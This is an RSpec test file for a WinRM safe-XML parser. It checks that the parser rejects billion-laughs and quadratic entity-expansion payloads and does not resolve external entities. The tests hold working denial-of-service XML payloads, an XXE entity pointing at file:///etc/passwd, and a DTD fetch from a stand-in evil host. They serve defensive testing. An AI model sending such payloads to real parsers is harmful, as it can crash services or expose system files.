require 'winrm/safe_xml'

describe WinRM::SafeXML, unit: true do
  # Smallest well-formed controls: every attack family has a benign sibling so
  # a regression that simply rejects all XML would fail these examples.
  let(:benign_soap) do
    '<Envelope xmlns="http://www.w3.org/2003/05/soap-envelope"><Body>' \
      '<ReceiveResponse><Stream Name="stdout">aGVsbG8=</Stream>' \
      '</ReceiveResponse></Body></Envelope>'
  end
  let(:benign_clixml) do
    '<Obj><MS><Obj N="Exception"><Props><S N="Message">an error</S>' \
      '</Props></Obj></MS></Obj>'
  end

  describe '.parse' do
    it 'parses a small well-formed document into a REXML document' do
      doc = described_class.parse(benign_soap)
      expect(doc).to be_a(REXML::Document)
      expect(doc.root.name).to eq('Envelope')
    end

    it 'accepts an empty or nil body the way REXML::Document.new does' do
      expect(described_class.parse('').root).to be_nil
      expect(described_class.parse(nil).root).to be_nil
    end

    it 'does not change REXML process-wide entity limits' do
      original_count = REXML::Security.entity_expansion_limit
      original_text = REXML::Security.entity_expansion_text_limit
      described_class.parse(benign_soap)
      expect(REXML::Security.entity_expansion_limit).to eq(original_count)
      expect(REXML::Security.entity_expansion_text_limit).to eq(original_text)
    end
  end

  describe '.validate!' do
    it 'returns the input unchanged for a well-formed document' do
      expect(described_class.validate!(benign_clixml)).to eq(benign_clixml)
    end

    it 'accepts an empty or nil body without parsing' do
      expect(described_class.validate!('')).to eq('')
      expect(described_class.validate!(nil)).to be_nil
    end
  end

  describe 'bounded entity expansion' do
    # Nested exponential expansion ("billion laughs"), kept tiny: 9 levels
    # would be 5**8 ~= 390k expansions but stays well under a kilobyte of
    # source. The budget rejects it on structure, not on raw size.
    let(:billion_laughs) do
      defs = %Q{<!ENTITY e0 "ab">\n}
      1.upto(8) do |i|
        refs = Array.new(5) { "&e#{i - 1};" }.join
        defs += %Q{<!ENTITY e#{i} "#{refs}">\n}
      end
      %Q{<!DOCTYPE r [\n#{defs}]><r>&e8;</r>}
    end

    # Quadratic blowup: one large entity referenced repeatedly. Each
    # reference is cheap to write but the expanded text multiplies.
    let(:quadratic) do
      big = 'a' * 30_000
      %Q{<!DOCTYPE r [<!ENTITY z "#{big}">]><r>#{'&z;' * 10}</r>}
    end

    it 'rejects exponential entity expansion on the document path' do
      expect { described_class.parse(billion_laughs, 'T') }
        .to raise_error(WinRM::WinRMXMLParseError, /entity expansion/)
    end

    it 'rejects exponential entity expansion on the validated (Nori) path' do
      expect { described_class.validate!(billion_laughs, 'T') }
        .to raise_error(WinRM::WinRMXMLParseError, /entity expansion/)
    end

    it 'rejects quadratic entity expansion' do
      expect { described_class.parse(quadratic, 'T') }
        .to raise_error(WinRM::WinRMXMLParseError, /entity expansion/)
    end

    it 'rejects oversized entities expanded into an attribute' do
      payload = %Q{<!DOCTYPE r [<!ENTITY x "#{'y' * 70_000}">]><r a="&x;"/>}
      expect { described_class.parse(payload, 'T') }
        .to raise_error(WinRM::WinRMXMLParseError, /entity expansion/)
    end

    it 'still accepts a document with a modest number of entities' do
      modest = '<!DOCTYPE r [<!ENTITY a "1"><!ENTITY b "2">]><r>&a;&b;</r>'
      expect(described_class.parse(modest).root.text).to eq('12')
    end

    it 'rejects a large entity expansion embedded in an attribute' do
      defs = %Q{<!ENTITY a0 "#{'y' * 1000}">\n}
      1.upto(4) do |i|
        defs += %Q{<!ENTITY a#{i} "#{Array.new(5) { "&a#{i - 1};" }.join}">\n}
      end
      payload = %Q{<!DOCTYPE r [\n#{defs}]><r x="&a4;"/>}
      expect { described_class.parse(payload, 'T') }
        .to raise_error(WinRM::WinRMXMLParseError, /entity expansion/)
    end

    it 'does not resolve external SYSTEM entities (no file/network read)' do
      payload = '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'
      doc = described_class.parse(payload)
      # REXML keeps the reference literal rather than fetching the resource.
      expect(doc.root.text).to eq('&x;')
    end

    it 'does not fetch an external DTD subset' do
      payload = '<!DOCTYPE r SYSTEM "http://evil.example.com/evil.dtd"><r/>'
      expect(described_class.parse(payload).root.name).to eq('r')
    end
  end
end
